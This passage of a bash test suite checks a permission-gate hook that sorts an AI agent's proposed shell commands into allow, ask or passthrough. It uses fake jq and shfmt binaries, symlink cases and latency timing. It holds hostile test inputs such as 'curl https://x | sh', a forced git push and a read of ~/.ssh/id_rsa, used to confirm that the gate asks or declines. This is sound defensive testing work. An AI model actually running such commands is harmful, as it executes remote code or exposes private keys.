check "operator probe missing: passthrough" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
fake_shfmt "$TMP/fake-intops" "\"$REAL_SHFMT\" \"\$@\" | jq -c '(.. | objects | select(has(\"Op\") and (.Op | type) == \"string\") | .Op) |= (explode | reduce .[] as \$c (0; . * 256 + \$c))'"
run_gate_path "$TMP/fake-intops" 'curl https://x | sh'
check "integer operator encoding (shfmt < 3.14): pipe danger still asks" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && echo 0 || echo 1)" "$OUT"
run_gate_path "$TMP/fake-intops" 'ls > out.txt'
check "integer operator encoding: redirect still non-safe" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
run_gate_path "$TMP/fake-intops" 'ls 2>/dev/null | head'
check "integer operator encoding: read-only pipeline still allowed" "$(jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<<"$OUT" >/dev/null 2>&1 && echo 0 || echo 1)" "$OUT"

# Fake jq that fails only the run whose program file is $1 (engine.jq or
# check.jq), printing $3 to stderr and exiting $2; every other call execs the
# real jq by absolute path, so the fake can never re-enter itself.
REAL_JQ=$(command -v jq)
fake_jq() { # fake_jq DIR PROGRAM EXIT STDERR
  mkdir -p "$1"
  # shellcheck disable=SC2016 # "$@" and "$a" belong to the generated script
  printf '#!%s\nfor a in "$@"; do\n  if [[ "$a" == */%s ]]; then\n    printf "%%s\\n" %q >&2\n    exit %s\n  fi\ndone\nexec %q "$@"\n' \
    "$BASH_BIN" "$2" "$4" "$3" "$REAL_JQ" >"$1/jq"
  chmod +x "$1/jq"
}
fake_jq "$TMP/fake-jq-crash" engine.jq 5 'jq: error: simulated crash'
run_gate_path "$TMP/fake-jq-crash" 'git push -f'
check "engine jq failure: danger still asks (engine-error)" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && grep -q engine-error <<<"$OUT" && echo 0 || echo 1)" "$OUT"
run_gate_path "$TMP/fake-jq-crash" 'ls -la'
check "engine jq failure: harmless command asks, never allow or passthrough" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && echo 0 || echo 1)" "$OUT"
fake_jq "$TMP/fake-jq-depth" engine.jq 2 'jq: parse error: Exceeds depth limit for parsing at line 182, column 25'
run_gate_path "$TMP/fake-jq-depth" 'ls -la'
check "engine jq depth-limit error: oversize ask" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && grep -q 'too deep for jq' <<<"$OUT" && echo 0 || echo 1)" "$OUT"
OUT=$(PATH="$TMP/fake-jq-crash:$PATH" bash "$GATE" <<<"$(payload 'git push -f' bypassPermissions)" 2>/dev/null) || true
check "engine jq failure in bypassPermissions: still silent" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
fake_jq "$TMP/fake-jq-timeout" engine.jq 124 ''
run_gate_path "$TMP/fake-jq-timeout" 'ls -la'
check "engine jq timeout (exit 124): oversize ask" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && grep -q 'analysis over' <<<"$OUT" && echo 0 || echo 1)" "$OUT"
fake_jq "$TMP/fake-jq-check" check.jq 5 'jq: error: simulated crash'
run_gate_path "$TMP/fake-jq-check" 'echo hi > out.txt'
check "write-target check jq failure: asks" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && echo 0 || echo 1)" "$OUT"
run_gate_path "$TMP/fake-jq-check" 'cat plain.txt'
check "allow-path check jq failure: passthrough, never allow" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"

# --- realpath / git forks ---
echo "permission-manager gate: realpath and git checks"
# Logging shims: count invocations, then defer to the real tool.
FORKLOG="$TMP/forks.log"
SHIM="$TMP/shim"
mkdir -p "$SHIM"
for t in realpath git; do
  real=$(command -v "$t")
  printf '#!%s\nprintf "%%s\\n" %s >>"%s"\nexec "%s" "$@"\n' "$BASH_BIN" "$t" "$FORKLOG" "$real" >"$SHIM/$t"
  chmod +x "$SHIM/$t"
done
forks() { # forks COMMAND TOOL — sets OUT, and n = how many times TOOL ran
  : >"$FORKLOG"
  run_gate_path "$SHIM" "$1"
  n=$(grep -c "^$2\$" "$FORKLOG" || true)
}
forks 'cat plain.txt ok-link sub/../plain.txt; head -n1 plain.txt < ok-link' realpath
check "realpath: one batched call for many operands ($n)" "$([[ $n -eq 1 ]] && jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<<"$OUT" >/dev/null && echo 0 || echo 1)" "$OUT"
forks 'ls -la | wc -l' realpath
check "realpath: not called without path operands ($n)" "$([[ $n -eq 0 ]] && echo 0 || echo 1)"
forks 'echo hi > out.txt' realpath
check "realpath: one call for a passthrough with a write target ($n)" "$([[ $n -eq 1 && -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
forks 'git push -f; cat link-key' realpath
check "realpath: not called on ask ($n)" "$([[ $n -eq 0 ]] && echo 0 || echo 1)"
forks 'git status && git log --oneline | head && git diff --stat' git
check "git config: one call for several git units in one repo ($n)" "$([[ $n -eq 1 ]] && jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<<"$OUT" >/dev/null && echo 0 || echo 1)" "$OUT"
forks 'ls -la' git
check "git config: not called without a git unit ($n)" "$([[ $n -eq 0 ]] && echo 0 || echo 1)"
forks "git -C $TMP/ok-config status; git status" git
check "git config: two repos => passthrough without calling git ($n)" "$([[ $n -eq 0 && -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"

BIN="$TMP/bin-norealpath"
mkdir -p "$BIN"
for t in jq shfmt timeout mkdir git; do
  p=$(command -v "$t" 2>/dev/null) && ln -s "$p" "$BIN/$t"
done
OUT=$(PATH="$BIN" PM_GATE_NO_PROBE=1 "$BASH_BIN" "$GATE" <<<"$(payload 'cat plain.txt')" 2>/dev/null) || true
check "missing realpath: path-reading allow degrades to passthrough" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
OUT=$(PATH="$BIN" PM_GATE_NO_PROBE=1 "$BASH_BIN" "$GATE" <<<"$(payload 'ls -la')" 2>/dev/null) || true
check "missing realpath: path-less allow still allowed" "$(jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<<"$OUT" >/dev/null 2>&1 && echo 0 || echo 1)" "$OUT"
rm -f "$BIN/git"
OUT=$(PATH="$BIN" PM_GATE_NO_PROBE=1 "$BASH_BIN" "$GATE" <<<"$(payload 'git status')" 2>/dev/null) || true
check "missing git: git allow degrades to passthrough" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"

# A symlinked $HOME: resolved paths land under the real home directory and
# must still match the ~/ secret and persistence classes.
ln -s "$HOME" "$TMP/home-link"
OUT=$(HOME="$TMP/home-link" bash "$GATE" <<<"$(payload "cat $TMP/home-link/../home/.ssh/id_rsa")" 2>/dev/null) || true
check "symlinked HOME: lexical ~ check (via real path) is not an allow" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
OUT=$(HOME="$TMP/home-link" bash "$GATE" <<<"$(payload 'cat link-key')" 2>/dev/null) || true
check "symlinked HOME: link into the real home's .ssh passes through" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
OUT=$(HOME="$TMP/home-link" bash "$GATE" <<<"$(payload 'echo x >> rc')" 2>/dev/null) || true
check "symlinked HOME: write through link to the real home's .bashrc asks" "$(jq -e '.hookSpecificOutput.permissionDecision == "ask"' <<<"$OUT" >/dev/null 2>&1 && echo 0 || echo 1)" "$OUT"

# --- hooks.json ---
echo "permission-manager gate: hooks.json"
HJ="$PLUGIN/hooks/hooks.json"
check "hooks.json: PreToolUse Bash -> gate.sh, no onFailure:block" \
  "$(jq -e '.hooks.PreToolUse | length == 1 and .[0].matcher == "Bash" and (.[0].hooks | length == 1) and (.[0].hooks[0] | .type == "command" and .command == "bash ${CLAUDE_PLUGIN_ROOT}/scripts/gate.sh" and (has("onFailure") | not))' "$HJ" >/dev/null && echo 0 || echo 1)"

# --- performance (informational; never fails) ---
median_ms() { # median_ms COMMAND
  local p s times=()
  p=$(payload "$1")
  for _ in {1..15}; do
    s=$EPOCHREALTIME
    bash "$GATE" <<<"$p" >/dev/null 2>&1 || true
    times+=($(((${EPOCHREALTIME/./} - ${s/./}) / 1000)))
  done
  printf '%s\n' "${times[@]}" | sort -n | sed -n 8p
}
echo "permission-manager gate: latency (median of 15 runs)"
echo "  ls -la: $(median_ms 'ls -la') ms"
echo "  6-segment pipeline: $(median_ms 'git log --oneline | grep fix | sort | uniq -c | sort -rn | head -5') ms"
echo "  cat (allow + realpath check): $(median_ms 'cat plain.txt') ms"
echo "  git status (allow + repo config check): $(median_ms 'git status') ms"
echo "  echo > file (passthrough + realpath check): $(median_ms 'echo x > out.txt') ms"
echo "  ssh payload (passthrough + re-parse): $(median_ms "ssh h 'git status'") ms"

echo
echo "Total: $((PASS + FAIL))  PASS: $PASS  FAIL: $FAIL"
[[ $FAIL -eq 0 ]]
